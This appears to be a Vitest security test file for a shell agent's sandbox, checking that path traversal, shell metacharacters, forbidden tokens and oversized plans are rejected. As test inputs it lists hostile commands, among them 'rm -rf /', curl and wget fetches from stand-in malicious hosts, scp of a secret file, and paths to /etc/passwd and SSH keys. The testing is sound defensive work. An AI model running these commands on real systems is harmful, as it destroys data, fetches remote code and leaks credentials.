import { describe, it, expect } from "vitest";
import {
  assertSafePath,
  assertArgsBudget,
  assertNoShellMeta,
  assertNoForbiddenTokens,
  SANDBOX_CONFIG,
} from "../../sandbox.js";
import { assertSafeTokensInPlan, createSafePlan } from "../../shell-plan.js";

describe("Shell Agent Security Tests", () => {
  const testWorkspaceRoot = process.cwd(); // Use actual workspace root

  describe("Path Security", () => {
    it("should reject _path traversal attacks", async () => {
      const attacks = [
        "../../../etc/passwd",
        "..\..$2..\\windows\\system32",
        "/etc/passwd",
        "~/.ssh/id_rsa",
        "./../../sensitive-file",
      ];

      for (const attack of attacks) {
        await expect(assertSafePath(testWorkspaceRoot, attack)).rejects.toThrow(
          /Path/,
        );
      }
    });

    it("should reject symlink attempts", async () => {
      // Note: This test would need actual symlinks to be comprehensive
      // For now, we test the pattern matching
      const suspiciousPaths = ["link-to-outside", "../outside-workspace"];

      for (const _path of suspiciousPaths) {
        await expect(assertSafePath(testWorkspaceRoot, _path)).rejects.toThrow(
          /Path/,
        );
      }
    });

    it("should allow safe paths within workspace", async () => {
      const safePaths = ["src", "README.md", "package.json"];

      // Test with paths that actually exist in the workspace
      for (const _path of safePaths) {
        try {
          await assertSafePath(testWorkspaceRoot, _path);
          // Should not throw for valid workspace paths
          expect(true).toBe(true);
        } catch (error) {
          // If it throws, make sure it's not a security issue
          const message = (error as Error).message;
          expect(message).not.toContain("Path escapes workspace");
          expect(message).not.toContain("symlink denied");
        }
      }
    });
  });

  describe("Argument Security", () => {
    it("should enforce argument budget limits", () => {
      // Too many arguments
      expect(() => assertArgsBudget(["a", "b", "c", "d", "e"])).toThrow(
        "too many args",
      );

      // Arguments too long
      const longArg = "x".repeat(SANDBOX_CONFIG.MAX_ARG_LENGTH + 1);
      expect(() => assertArgsBudget([longArg])).toThrow("Arg too long");
    });

    it("should allow reasonable arguments", () => {
      expect(() => assertArgsBudget(["src", "README.md"])).not.toThrow();

      expect(() =>
        assertArgsBudget(["export", "function", "hello"]),
      ).not.toThrow();
    });
  });

  describe("Shell Metacharacter Detection", () => {
    it("should reject dangerous shell metacharacters", () => {
      const dangerousInputs = [
        "file.txt; rm -rf /",
        "file.txt && malicious-command",
        "file.txt | grep secret",
        "file.txt > /dev/null",
        "file.txt < input.txt",
        "file.txt `malicious`",
        "file.txt $(dangerous)",
        "file.txt & background-process",
      ];

      for (const input of dangerousInputs) {
        expect(() => assertNoShellMeta(input)).toThrow(
          "shell metacharacters not allowed",
        );
      }
    });

    it("should allow safe file references", () => {
      const safeInputs = [
        "file.txt",
        "src/index.ts",
        "package.json",
        "README.md",
        "output-file.log",
      ];

      for (const input of safeInputs) {
        expect(() => assertNoShellMeta(input)).not.toThrow();
      }
    });
  });

  describe("Forbidden Token Detection", () => {
    it("should detect dangerous command tokens", () => {
      const dangerousTokens = [
        "rm -rf /",
        "sudo install malware",
        "curl evil-site.com/script.sh",
        "wget http://malicious.com/payload",
        "scp secret-file remote-server:",
        "ssh user@remote-server",
      ];

      for (const token of dangerousTokens) {
        expect(() => assertNoForbiddenTokens(token)).toThrow(
          "forbidden tokens detected",
        );
      }
    });

    it("should allow safe content", () => {
      const safeContent = [
        'export function hello() { return "world"; }',
        'const message = "Hello, world!";',
        "npm install package-name",
        'console.log("Debug message");',
      ];

      for (const content of safeContent) {
        expect(() => assertNoForbiddenTokens(content)).not.toThrow();
      }
    });
  });

  describe("Plan-Level Security", () => {
    it("should detect forbidden tokens in execution plans", () => {
      const dangerousPlan = createSafePlan("read", [
        { op: "read", args: ["file.txt"], comment: "rm -rf / after reading" },
      ]);

      expect(() => assertSafeTokensInPlan(dangerousPlan)).toThrow(
        "forbidden tokens detected",
      );
    });

    it("should allow safe execution plans", () => {
      const safePlan = createSafePlan("read", [
        {
          op: "read",
          args: ["README.md"],
          comment: "Reading project documentation",
        },
        {
          op: "search",
          args: ["export", "src"],
          comment: "Finding exported functions",
        },
      ]);

      expect(() => assertSafeTokensInPlan(safePlan)).not.toThrow();
    });

    it("should enforce step limits in plans", () => {
      const tooManySteps = Array(10)
        .fill(0)
        .map(() => ({
          op: "read" as const,
          args: ["file.txt"],
          comment: "Reading file",
        }));

      expect(() => createSafePlan("read", tooManySteps)).toThrow(
        "too many steps",
      );
    });

    it("should enforce preview budget limits", () => {
      // This should fail due to total preview budget (30000 + 25000 > 50000)
      expect(() => {
        createSafePlan("read", [
          { op: "read", args: ["file1.txt"], previewLimit: 30000 },
          { op: "read", args: ["file2.txt"], previewLimit: 25000 },
        ]);
      }).toThrow("total preview budget exceeded");
    });
  });

  describe("Comprehensive Security Stack", () => {
    it("should protect against combined attack vectors", () => {
      // Simulate a sophisticated attack combining multiple vectors
      const attackArgs = [
        "../../../etc/passwd; rm -rf /",
        "$(curl evil.com/script.sh)",
        "normal-file.txt",
        "&& sudo malicious-command",
      ];

      // Path validation should catch the first argument
      expect(async () => {
        await assertSafePath(testWorkspaceRoot, attackArgs[0]);
      }).rejects.toThrow();

      // Shell metacharacter detection should catch the second argument
      expect(() => assertNoShellMeta(attackArgs[1])).toThrow(
        "shell metacharacters",
      );

      // Token detection should catch the fourth argument
      expect(() => assertNoForbiddenTokens(attackArgs[3])).toThrow(
        "forbidden tokens",
      );
    });
  });
});
